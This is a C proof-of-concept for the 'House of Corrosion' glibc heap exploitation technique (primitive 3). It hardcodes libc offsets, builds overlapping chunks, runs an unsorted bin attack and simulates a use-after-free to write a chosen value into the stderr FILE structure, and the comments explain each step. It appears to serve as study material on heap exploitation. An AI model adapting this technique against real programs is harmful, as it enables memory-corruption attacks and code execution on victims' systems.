/*
 * House of Corrosion
 * Primitive 3:
 * 
 */


#include <stdio.h>
#include <stdlib.h>
#include <malloc.h>
#include <assert.h>


#define CHUNK_SIZE(delta) \
    ((unsigned long)(delta) * 2 + 0x20)

#define MALLOC_SIZE(delta) \
    ((CHUNK_SIZE(delta)) - 0x8)

#define REQ_TO_SIZE(req) \
    ((unsigned long)(req) + 8 & ~0xf)

// Prepare overlapping chunks A & B.
// chunk A will start before B.
// controller chunk will start slightly before A,
// so that it can be used to overwrite size of A and B.
// memory layout will be as follows;
// (chunk_size = 0x58) controller | (chunk_size = size) A | (chunk_size = size) B
//
// constraint: (addr_A & ~0xff) == (addr_controller & ~0xff)
#define OVERLAP_CHUNKS(A, B, controller, lsb_bef_A, tmp, pad_size) \
    if (pad_size) malloc(pad_size); \
    (controller) = malloc(0x58); \
    (A) = malloc(0x18); \
    (B) = malloc(0x18); \
    (tmp) = malloc(0x58); \
    assert(((unsigned long)A & ~0xffUL) == ((unsigned long)controller & ~0xffUL)); \
    free(controller); \
    free(tmp); \
    ((char *)tmp)[0] = lsb_bef_A; /*tmp->next == (A - 0x2)*/ \
    (tmp) = malloc(0x58); \
    (controller) = malloc(0x58);


unsigned long offset_gmf = 0x3ed940;
unsigned long offset_main_arena = 0x3ebc40;
unsigned long offset_io_2_1_stdin = 0x3eba00;
unsigned long offset_io_2_1_stderr = 0x3ec680;
unsigned long offset_unsorted_bin = 0x3ebca0;
unsigned long offset_fastbinsY = 0x3ebc50;


int main(void) {
    int i;
    unsigned long addr_libc = (unsigned long)stdin - offset_io_2_1_stdin;

    unsigned long stderr_size = MALLOC_SIZE((unsigned long)stderr - (addr_libc + offset_fastbinsY)); // src size
    unsigned long stderr_0x60_size = MALLOC_SIZE((unsigned long)stderr + 0x60 - (addr_libc + offset_fastbinsY)); // dst size

    unsigned long *uba = malloc(0x418);
    unsigned long *pc0 = malloc(0x18);
    unsigned long *src = malloc(stderr_size);
    unsigned long *pc1 = malloc(0x18);

    unsigned long  *A, *B, *controller, *tmp;
    OVERLAP_CHUNKS(A, B, controller, '\x90', tmp, 0x0);
    controller[1] = REQ_TO_SIZE(stderr_0x60_size) | 1; // overwrite size of chunk A
    controller[5] = REQ_TO_SIZE(stderr_0x60_size) | 1; // overwrite size of chunk B

    unsigned long *spray_fake_size = malloc(stderr_0x60_size + 0x100);
    for (i = 0; i < (stderr_0x60_size + 0x100) / 8; i++) {
        // spray fake valid size to avoid
        // "free(): invalid next size (fast)"
        *(spray_fake_size + i) = 0x31;
    }

    free(uba);
    // 4 bit guess is required but cheat for now
    // overwrite bk
    uba[1] = addr_libc + offset_gmf - 0x10;

    // carry out unsorted bin attack
    malloc(0x418);

    // link chunk to _IO_2_1_stderr
    free(src);

    // Simulate UAF
    // Overwrite fd
    *src = 0xdeadbeefcafebabe;
    // Unlink freed chunk from fastbins
    // Overwritten fd should be written to the fake fastbins link header (_IO_2_1_stderr in this example)
    malloc(stderr_size);

    free(B); // link B to (stderr + 0x60) as fastbin
    free(A); // link A to (stderr + 0x60) as fastbin
    // (stderr + 0x60)-> chunk A -> chunk B

    *((char *)A) = '\x90'; // point A to itself

    // Overwrite with src chunk size
    // The corresponding fastbin list header will be at _IO_2_1_stderr
    controller[1] = REQ_TO_SIZE(stderr_size) | 1;
    // A->fd will be overwritten by the value in _IO_2_1_stderr (0xdeadbeefcafebabe)
    // 0xdeadbeefcafebabe is linked to fastbins (size = REQ_TO_SIZE(stderr_0x60_size))
    free(A);

    // Overwrite with dst chunk size
    // The corresponding fastbin list header will be at _IO_2_1_stderr+0x60
    controller[1] = REQ_TO_SIZE(stderr_0x60_size) | 1;
    // Since 0xdeadbeefcafebabe is linked to fastbins (size = REQ_TO_SIZE(stderr_0x60_size))
    // calling malloc again will *(_IO_2_1_stderr_ + 0x60/8) = 0xdeadbeefcafebabe
    // Transplanting is done.
    malloc(stderr_0x60_size);

    return 0;
}
